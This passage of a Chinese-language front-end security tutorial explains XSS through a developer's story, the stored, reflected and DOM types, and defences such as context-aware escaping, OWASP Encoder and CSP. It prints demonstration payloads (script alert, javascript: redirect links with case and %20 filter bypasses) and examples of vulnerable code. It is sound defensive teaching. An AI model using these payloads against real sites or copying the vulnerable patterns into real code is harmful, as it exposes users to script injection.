class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#x2F;</span>script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#x2F;</span>script<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p><p><strong>通过这个事件，小明学习到了如下知识：</strong></p><ul><li>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</li><li>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</li><li>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</li><li>通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。</li></ul><h4 id="注意特殊的-HTML-属性、JavaScript-API"><a href="#注意特殊的-HTML-属性、JavaScript-API" class="headerlink" title="注意特殊的 HTML 属性、JavaScript API"></a>注意特殊的 HTML 属性、JavaScript API</h4><p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p><p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p><p>不久，小明又收到安全组的神秘链接：<code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p><p>小明打开对应页面的源码，发现有以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span><span class="attr">redirect_to</span>&quot;)) %&gt;</span>&quot;&gt;跳转...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码，当攻击 URL 为 <code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>，服务端响应就成了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>)&quot;</span>&gt;</span>跳转...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p><blockquote><p>可恶，又失策了…</p></blockquote><p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p><p>原来不仅仅是特殊字符，连 <code>javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p><p>小明眉头一皱，想到了解决办法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 禁止 URL 以 &quot;javascript:&quot; 开头</span></span><br><span class="line">xss = getParameter(<span class="string">&quot;redirect_to&quot;</span>).startsWith(<span class="string">&#x27;javascript:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!xss) &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="string">&quot;))%&gt;&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;/404&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要 URL 的开头不是 <code>javascript:</code>，就安全了吧？</p><p>安全组随手又扔了一个连接：<code>http://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;)</code></p><blockquote><p>这也能执行？…..好吧，浏览器就是这么强大。</p></blockquote><p>小明欲哭无泪，在判断 URL 开头是否为 <code>javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p><p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;?redirect_to&#x3D;%20javascript:alert(&#39;XSS&#39;)</span><br></pre></td></tr></table></figure><p><code>%20javascript:alert(&#39;XSS&#39;)</code> 经过 URL 解析后变成 <code>javascript:alert(&#39;XSS&#39;)</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p><p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span><br><span class="line">allowSchemes = [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>];</span><br><span class="line"></span><br><span class="line">valid = isValid(getParameter(<span class="string">&quot;redirect_to&quot;</span>), allowSchemes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (valid) &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="string">&quot;))%&gt;&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;/404&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个事件，小明学习到了如下知识：</p><ul><li>做了 HTML 转义，并不等于高枕无忧。</li><li>对于链接跳转，如 <code>&lt;a href=&quot;xxx&quot;</code> 或 <code>location.href=&quot;xxx&quot;</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 scheme。</li></ul><h4 id="根据上下文采用不同的转义规则"><a href="#根据上下文采用不同的转义规则" class="headerlink" title="根据上下文采用不同的转义规则"></a>根据上下文采用不同的转义规则</h4><p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> initData = &lt;%= data.toJSON() %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 <code>&quot;</code> 后，JSON 格式会被破坏。</p><p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p><ul><li>当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</li><li>当 JSON 中包含字符串 <code>&lt;/script&gt;</code> 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code>&lt;script&gt;</code> 标签等方法就可以完成注入。</li></ul><p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><p><strong>转义规则如下：</strong></p><p>|字符|转义后的字符| |-|-| |<code>U+2028</code>|<code>\u2028</code>| |<code>U+2029</code>|<code>\u2029</code>| |<code>&lt;</code>|<code>\u003c</code>|</p><p><strong>修复后的代码如下：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt;</span></span><br></pre></td></tr></table></figure><p><strong>通过这个事件，小明学习到了如下知识：</strong></p><ul><li>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</li><li>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</li></ul><h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h3><p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p><ul><li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li><li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li><li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li><li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li><li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li></ul><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p><h2 id="XSS-攻击的分类"><a href="#XSS-攻击的分类" class="headerlink" title="XSS 攻击的分类"></a>XSS 攻击的分类</h2><p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p><h3 id="什么是-XSS"><a href="#什么是-XSS" class="headerlink" title="什么是 XSS"></a>什么是 XSS</h3><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p><p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p><p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p><p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p><ul><li>来自用户的 UGC 信息</li><li>来自第三方的链接</li><li>URL 参数</li><li>POST 参数</li><li>Referer （可能来自不可信的来源）</li><li>Cookie （可能来自其他子域注入）</li></ul><h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><p>|类型|存储区*|插入点*| |-|-| |存储型 XSS|后端数据库|HTML| |反射型 XSS|URL|HTML| |DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|</p><ul><li>存储区：恶意代码存放的位置。</li><li>插入点：由谁取得恶意代码，并插入到网页上。</li></ul><h4 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h4><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><p>反射型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2 id="XSS-攻击的预防"><a href="#XSS-攻击的预防" class="headerlink" title="XSS 攻击的预防"></a>XSS 攻击的预防</h2><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><ol><li>攻击者提交恶意代码。</li><li>浏览器执行恶意代码。</li></ol><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &lt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的“并不确定内容要输出到哪里”有两层含义：</p><ol><li><p>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码( <code>5 &lt; 7</code> )。</p></li><li><p>在前端中，不同的位置所需的编码也不同。</p><ul><li>当 <code>5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">title</span>=<span class="string">&quot;comment&quot;</span>&gt;</span>5 <span class="symbol">&amp;lt;</span> 7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>当 <code>5 &lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</li></ul></li></ol><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p><ul><li>防止 HTML 中出现注入。</li><li>防止 JavaScript 执行时，执行恶意代码。</li></ul><h3 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><ul><li>改成纯前端渲染，把代码和数据分隔开。</li><li>对 HTML 做充分转义。</li></ul><h4 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h4><p>纯前端渲染的过程：</p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h4 id="转义-HTML"><a href="#转义-HTML" class="headerlink" title="转义 HTML"></a>转义 HTML</h4><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#39; /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><p>|XSS 安全漏洞|简单转义是否有防护作用| |-|-| |HTML 标签文字内容|有| |HTML 属性值|有| |CSS 内联样式|无| |内联 JavaScript|无| |内联 JSON|无| |跳转链接|无|</p><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 <a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project">org.owasp.encoder 的官方说明</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 标签内文字内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 标签属性值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CSS 属性值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CSS URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 内联代码块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> msg = <span class="string">&quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;</span>;</span></span><br><span class="line">  alert(msg);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> __INITIAL_STATE__ = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 标签内联监听器 --&gt;</span></span><br><span class="line">&lt;button</span><br><span class="line">  onclick=&quot;alert(&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;);&quot;&gt;</span><br><span class="line">  click me</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- URL 参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- URL 路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  URL.</span></span><br><span class="line"><span class="comment">  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&lt;%=</span></span></span><br><span class="line"><span class="tag"><span class="string">  urlValidator.isValid(UNTRUSTED) ?</span></span></span><br><span class="line"><span class="tag"><span class="string">    Encode.forHtml(UNTRUSTED) :</span></span></span><br><span class="line"><span class="tag"><span class="string">    &quot;/404&quot;</span></span></span><br><span class="line"><span class="tag"><span class="string">%&gt;&#x27;</span>&gt;</span></span><br><span class="line">  link</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p><h3 id="预防-DOM-型-XSS-攻击"><a href="#预防-DOM-型-XSS-攻击" class="headerlink" title="预防 DOM 型 XSS 攻击"></a>预防 DOM 型 XSS 攻击</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span></span><br><span class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 链接内包含恶意代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;UNTRUSTED&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// setTimeout()/setInterval() 中调用恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">setInterval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">// location 调用恶意代码</span></span></span><br><span class="line"><span class="javascript">location.href = <span class="string">&#x27;UNTRUSTED&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">// eval() 中调用恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2 id="其他-XSS-防范措施"><a href="#其他-XSS-防范措施" class="headerlink" title="其他 XSS 防范措施"></a>其他 XSS 防范措施</h2><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p><h3 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li><li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p><h3 id="输入内容长度控制"><a href="#输入内容长度控制" class="headerlink" title="输入内容长度控制"></a>输入内容长度控制</h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p><h3 id="其他安全措施"><a href="#其他安全措施" class="headerlink" title="其他安全措施"></a>其他安全措施</h3><ul><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 